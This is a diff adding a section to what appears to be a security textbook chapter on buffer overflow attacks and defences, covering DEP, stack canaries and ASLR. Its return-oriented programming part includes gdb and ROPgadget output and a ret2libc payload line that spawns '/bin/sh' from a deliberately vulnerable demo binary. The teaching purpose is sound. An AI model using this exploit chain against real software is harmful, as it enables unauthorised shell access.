@@ -156,3 +156,129 @@ You can also turn off the ASLR as following.
 ```
 
 ## Section 2. Protection Techniques
+To prevent smashing attackes, we may either try to avoid buffer overflow bugs or to increase the difficulty of attacks. To avoid buffer overflow bugs, a widely employd technique during programming is fat pointer. Note that it is generally difficult to detect buffer overflow vulnerabilities during compiling time because whether a pointer points to an out-of-bound address is undecidable. The fat pointer contains additional size information which enables the problem to perform runtime boundary check. We leave the detailed discussion of such programming techniques to later chapters. 
+
+The attack and protection techniques coevolve.
+
+Attack: Stack Smashing 
+=> Defense: Data Execution Prevention
+===> Attack: Return-oriented Programming
+=====> Defense ：ASLR, Stack Canary
+=======> Attack ：Side Channel 
+=========> Defense ：Shadown Stack 
+===========> ...
+
+### 1.2.1 DEP 
+DEP is a technique that disable the stack data from being executed. It achieves the purpose by setting the flag of the stack to RW instead of RWE.
+```
+#: readelf -l bug
+There are 9 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset     VirtAddr           PhysAddr    FileSiz   MemSiz      Flags  Align
+  PHDR           0x...00040 0x...00400040 0x...00400040   0x...001f8 0x...001f8  R E    8
+  INTERP         0x...00238 0x...00400238 0x...00400238   0x...0001c 0x...0001c  R      1
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+  LOAD           0x...00000 0x...00400000 0x...00400000   0x...00864 0x...00864  R E    200000
+  LOAD           0x...00e10 0x...00600e10 0x...00600e10   0x...00230 0x...00238  RW     200000
+  DYNAMIC        0x...00e28 0x...00600e28 0x...00600e28   0x...001d0 0x...001d0  RW     8
+  NOTE           0x...00254 0x...00400254 0x...00400254   0x...00044 0x...00044  R      4
+  GNU_EH_FRAME   0x...00710 0x...00400710 0x...00400710   0x...0003c 0x...0003c  R      4
+  GNU_STACK      0x...00000 0x...00000000 0x...00000000   0x...00000 0x...00000  RWE    10
+  GNU_RELRO      0x...00e10 0x...00600e10 0x...00600e10   0x...001f0 0x...001f0  R      1
+```
+
+### 1.2.2 RoP Attack
+If DEP is enabled, we cannot inject shellcode directly on the stack. The idea of RoP is to use existing codes to achieve the same sematics. For example, we may change the return address to the system function. As long as we can set the patameter to "/bin/sh" before that, we should be able to execute system("/bin/sh") and obtain the shell. 
+
+The following figure demonstrates the mechanism of an RoP attack. We first change the return address to some gaddet code that allow us to assign the parameter value to "/bin/sh". According to the calling convention of x86_64, the first parameter is saved in the rdi register. Therefore, some instructions containing "pop rdi" might be useful as our gadget. In our example, after "pop rdi", the "ret" instruction will use the data on top of the stack as the return address. We set the address to the function entry of system().
+
+![image](./figures/chapt1-rop.png)
+
+```
+#: clang -fno-stack-protector bug.c -o bug
+#: gdb bug
+(gdb) break *validation
+Breakpoint 1 at 0x401150
+(gdb) r
+Starting program: bug 
+Input your key:
+Breakpoint 1, 0x0000000000401150 in validation ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0x7ffff7e18410 <__libc_system>
+(gdb) find 0x7ffff7e18410, +2000000, "/bin/sh"
+0x7ffff7f7a5aa
+```
+```
+#: ldd bug
+        linux-vdso.so.1 (0x00007ffff7fcd000)
+        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc3000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcf000)
+```
+```
+#: ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
+0x00000000000276e9 : pop rdi ; pop rbp ; ret
+0x0000000000026b72 : pop rdi ; ret
+0x00000000000e926d : pop rdi ; ret 0xfff3
+```
+
+```
+system_addr = 0x7ffff7e18410
+binsh_addr = 0x7ffff7f7a5aa
+
+libc = ELF('libc.so.6')
+ret_offset = 0x0000000000026b72 - libc.symbols['system']
+ret_addr = system_addr + ret_offset
+
+payload = "A" * 88 + p64(ret_addr) + p64(binsh_addr) + p64(system_addr) 
+```
+
+### 1.2.3 Stack Canary 
+Stack canary is a widely used technique to check the stack integrity with a sentinel. Developers can enable stack canary with an option -fstack-protector when compiling their code. The generated assembly code is shown as following.
+
+```
+push   %rbp
+mov    %rsp,%rbp
+sub    $0x80,%rsp
+xor    %edi,%edi
+mov    $0x64,%eax
+mov    %eax,%edx
+lea    -0x50(%rbp),%rsi
+mov    %fs:0x28,%rcx
+mov    %rcx,-0x8(%rbp)
+…
+mov    %fs:0x28,%rcx
+cmp    -0x8(%rbp),%rcx
+mov    %eax,-0x74(%rbp)
+jne    0x400691 <validation+177>
+mov    -0x74(%rbp),%eax
+add    $0x80,%rsp
+pop    %rbp
+retq   
+callq  0x4004a0 <__stack_chk_fail@plt>
+```
+
+In the assembly code, fs:0x28 stores the sentinel stack-guard value. The code moves the value to -0x8(%rbp) and finally compare it with the original value when the function returns. 
+|                |
+|:--------------:|
+| previous frame |
+|   ret address  |
+|    old rbp     |
+|    canary      |
+|                |
+
+
+### 1.2.4 ASLR
+ASLR randomizes memory allocations to make memory addresses harder to predict. The technique is implemented by the kernel and the ELF loader. In general, there are three levels of ASLR:
+- Stack ASLR: each execution results in a different stack address.
+- Mmap ASLR: each execution results in a different memory map.
+- Exec ASLR: the program is loaded into a different memory location in each each execution. This is also known as position-independent executables.
+
+To set the levels of ASLR, use the following command.
+```
+#: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+```
+
+
+
+
